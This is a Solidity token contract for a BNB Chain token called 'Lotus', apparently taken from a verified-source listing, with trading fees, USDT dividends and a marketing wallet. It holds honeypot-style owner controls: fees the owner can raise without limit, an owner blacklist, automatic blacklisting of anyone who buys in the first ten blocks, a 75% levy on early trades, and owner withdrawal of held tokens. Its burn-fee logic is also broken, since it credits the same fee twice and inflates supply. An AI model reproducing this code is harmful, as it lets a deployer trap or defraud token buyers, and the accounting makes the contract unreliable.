/**
 *Submitted for verification at BscScan.com on 2023-01-06
*/

/**
 *Submitted for verification at BscScan.com on 2023-01-05
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _owner = msg.sender;
    }

    modifier onlyOwner() {
        require(_owner==msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address payable adr) public virtual onlyOwner {
        _owner = adr;
        emit OwnershipTransferred(_owner,adr);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

abstract contract baseToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _tTotal;

    uint256 private constant MAX = ~uint256(0);

    uint256 public _buyMarketingFee = 10;
    uint256 public _buyLPDividendFee = 9;
    uint256 public _buyLPFee = 0;

    uint256 public _sellMakingFee =15;
    uint256 public _sellLPDividendFee = 14;
    uint256 public _sellLPFee =0;
    uint256 public _burnFee = 1;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _blackList;

    uint256 public _maxTxAmount;
    uint256 public _maxWalletToken;

    mapping (address => bool) isTxLimitExempt;
    mapping (address => bool) isWalletLimitExempt;

    ISwapRouter public _swapRouter;
    IERC20 USDT;
    mapping(address => bool) public _swapPairList;
    TokenDistributor public _tokenDistributor;

    uint256 public startAddLPBlock;
    uint256 public startTradeBlock;
    address public _mainPair;

    address[] marketingAddress=[0x6E6aC75416Ab0A444e27Ab8817351Afd3C34af77];
    uint256[] marketingShare=[100];
    uint256 sharetotal=100;

    bool public swapEnabled = true;
    uint256 public swapThreshold;
    uint256 public maxSwapThreshold;

    bool private inSwap;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address RouterAddress, address USDTAddress,address deployer,
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply) payable Ownable() {
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;
        USDT = IERC20(USDTAddress);
        USDT.approve(address(swapRouter), MAX);

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), USDTAddress);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;
        uint256 total = Supply * 10 ** Decimals;

        _maxTxAmount = 20 * 10 ** Decimals;
        _maxWalletToken = total;

        _tTotal = total;
        swapThreshold = total / 1000;
        maxSwapThreshold = total / 100;

        _feeWhiteList[address(this)] = true;
        _feeWhiteList[deployer] = true;
        _feeWhiteList[msg.sender] = true;
        
        isTxLimitExempt[msg.sender] = true;

        isWalletLimitExempt[msg.sender] = true;
        isWalletLimitExempt[address(0xdead)] = true;
        isWalletLimitExempt[address(this)] = true;
        isWalletLimitExempt[swapPair] = true;

        excludeHolder[address(0)] = true;
        excludeHolder[address(0xdEaD)] = true;

        holderRewardCondition = 1 * 10 ** IERC20(USDTAddress).decimals();
        _tokenDistributor = new TokenDistributor(USDTAddress);

        _balances[deployer] = total;
        emit Transfer(address(0), deployer, total);
    }

    function symbol() external view override returns (string memory) {return _symbol;}
    function name() external view override returns (string memory) {return _name;}
    function decimals() external view override returns (uint8) {return _decimals;}
    function totalSupply() public view override returns (uint256) {return _tTotal;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!_blackList[from], "blackList");
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        // Checks max transaction limit
        require(
            amount <= _maxTxAmount || isTxLimitExempt[from],
            "TX Limit Exceeded"
        );

        require(
            (balanceOf(to) + amount) <= _maxWalletToken ||
                isWalletLimitExempt[to],
            "Total Holding is currently limited, he can not hold that much."
        );

        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            uint256 airdropAmount = balance / 10000;
            address ad;
            for(int i=0;i < 3;i++){
                ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                _takeTransfer(from,ad,airdropAmount);
            }
            amount -= airdropAmount;
        }

        bool takeFee;
        bool isSell;

        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (0 == startTradeBlock) {
                    require(0 < startAddLPBlock && _swapPairList[to], "!startAddLP");
                }
                if (block.number < startTradeBlock + 10) {
                    _funTransfer(from, to, amount);
                    if(_swapPairList[from]){_blackList[to] = true;}
                    return;
                }
                if (_swapPairList[to]) {
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (swapEnabled && contractTokenBalance > 0) {
                            if(contractTokenBalance > maxSwapThreshold)contractTokenBalance = maxSwapThreshold;
                            swapTokenForFund(contractTokenBalance);
                        }
                    }
                }
                takeFee = true;
            }
            if (_swapPairList[to]) {
                isSell = true;
            }
        }
        _tokenTransfer(from, to, amount, takeFee, isSell);
        if (from != address(this)) {
            if (isSell) {
                addHolder(from);
            }
            processReward(500000);
        }
    }

    function setMaxWalletPercent_base10000(uint256 maxWallPercent_base10000) external onlyOwner() {
        _maxWalletToken = (_tTotal * maxWallPercent_base10000 ) / 10000;
    }

    function setMaxTxPercent_base10000(uint256 maxTXPercentage_base10000) external onlyOwner() {
        _maxTxAmount = (_tTotal * maxTXPercentage_base10000 ) / 10000;
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * 75 / 100;
        _takeTransfer(
            sender,
            address(this),
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        
        uint256 feeAmount;
        if (takeFee) {
            uint256 swapFee;
            if (isSell) {
                swapFee = _sellMakingFee + _sellLPDividendFee + _sellLPFee + _burnFee;
            } else {
                swapFee = _buyMarketingFee + _buyLPFee + _buyLPDividendFee + _burnFee;
            }
            uint256 swapAmount = tAmount * swapFee / 100;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                if(_burnFee > 0){
                    uint256 burnamount =  tAmount * _burnFee / 100;
                    feeAmount -= burnamount;
                    _takeTransfer(
                        sender,
                        address(0xdead),
                        swapAmount
                    );
                }
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
                );
            }
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function setIsTxLimitExempt(address holder, bool exempt) external onlyOwner {
        isTxLimitExempt[holder] = exempt;
    }

    function setIsWalletLimitExempt(address holder, bool exempt) external onlyOwner {
        isWalletLimitExempt[holder] = exempt;
    }

    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        uint256 totalFee = _buyMarketingFee + _buyLPDividendFee + _buyLPFee + _sellMakingFee + _sellLPDividendFee + _sellLPFee;
        uint256 lpFee = _sellLPFee + _buyLPFee;
        uint256 lpAmount = tokenAmount * lpFee / totalFee / 2;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(USDT);
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );

        uint256 usdtBalance = USDT.balanceOf(address(_tokenDistributor));
        uint256 fundAmount = usdtBalance * (_buyMarketingFee + _sellMakingFee) / totalFee;
        if(fundAmount>0){
            uint256 cakeBNB; 
            for (uint256 i = 0; i < marketingAddress.length; i++) {
                cakeBNB=fundAmount * marketingShare[i] /sharetotal; 
                 USDT.transferFrom(address(_tokenDistributor),marketingAddress[i],cakeBNB); 
            } 
        }

        USDT.transferFrom(address(_tokenDistributor), address(this), usdtBalance - fundAmount);
        if (lpAmount > 0) {
            uint256 lpFeeAmount = usdtBalance * lpFee / totalFee;
            if (lpFeeAmount > 0) {
                _swapRouter.addLiquidity(
                    address(this), address(USDT), lpAmount, lpFeeAmount, 0, 0, marketingAddress[0], block.timestamp
                );
            }
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setBuyFee(uint256 dividendFee,uint256 marketingFee,uint256 LPFee) external onlyOwner {
        _buyMarketingFee = marketingFee;
        _buyLPDividendFee = dividendFee;
        _buyLPFee = LPFee;
    }

    function setSellFee(uint256 dividendFee,uint256 marketingFee,uint256 LPFee) external onlyOwner {
        _sellLPDividendFee = dividendFee;
        _sellMakingFee = marketingFee;
        _sellLPFee = LPFee;
    }

    function setSwapBackSettings(bool _enabled, uint256 _swapThreshold, uint256 _maxSwapThreshold) external onlyOwner {
        swapEnabled = _enabled;
        swapThreshold = _swapThreshold;
        maxSwapThreshold = _maxSwapThreshold;
    }

    function openAddLP() external onlyOwner {
        if(startAddLPBlock == 0){
            startAddLPBlock = block.number;
        }else{
            startAddLPBlock = 0;
        }
    }

    function openTrade() external onlyOwner {
        if(startAddLPBlock == 0){
            startTradeBlock = block.number;
        }else{
            startTradeBlock = 0;
        }
    }
 

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }

    function setBlackList(address addr, bool enable) external onlyOwner {
        _blackList[addr] = enable;
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function claimBalance(address addr,uint256 amountPercentage) external onlyOwner {
        payable(addr).transfer(address(this).balance*amountPercentage / 100);
    }

    function claimToken(address token,address addr, uint256 amountPercentage) external onlyOwner {
        uint256 amountToken = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(addr,amountToken * amountPercentage / 100);
    }

    receive() external payable {}

    address[] private holders;
    mapping(address => uint256) holderIndex;
    mapping(address => bool) excludeHolder;
    function addHolder(address adr) private {
        uint256 size;
        assembly {size := extcodesize(adr)}
        if (size > 0) {
            return;
        }
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    uint256 private currentIndex;
    uint256 private holderRewardCondition;
    uint256 private progressRewardBlock;
    function processReward(uint256 gas) private {
        if (progressRewardBlock + 200 > block.number) {
            return;
        }
        uint256 balance = USDT.balanceOf(address(this));
        if (balance < holderRewardCondition) {
            return;
        }
        IERC20 holdToken = IERC20(_mainPair);
        uint holdTokenTotal = holdToken.totalSupply();
        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;
        uint256 shareholderCount = holders.length;
        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            tokenBalance = holdToken.balanceOf(shareHolder);
            if (tokenBalance > 0 && !excludeHolder[shareHolder]) {
                amount = balance * tokenBalance / holdTokenTotal;
                if (amount > 0) {
                    USDT.transfer(shareHolder, amount);
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
        progressRewardBlock = block.number;
    }

    function setHolderRewardCondition(uint256 amount) external onlyOwner {
        holderRewardCondition = amount;
    }

    function setExcludeHolder(address addr, bool enable) external onlyOwner {
        excludeHolder[addr] = enable;
    }

}

contract Token is baseToken {
    constructor() baseToken(
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
        address(0x55d398326f99059fF775485246999027B3197955),
        address(0x8E8F7039D26c35692AcE8840401F4Cf3ce08E490),
        "Lotus",
        "Lotus",
        18,
        1604
    ){
    }
}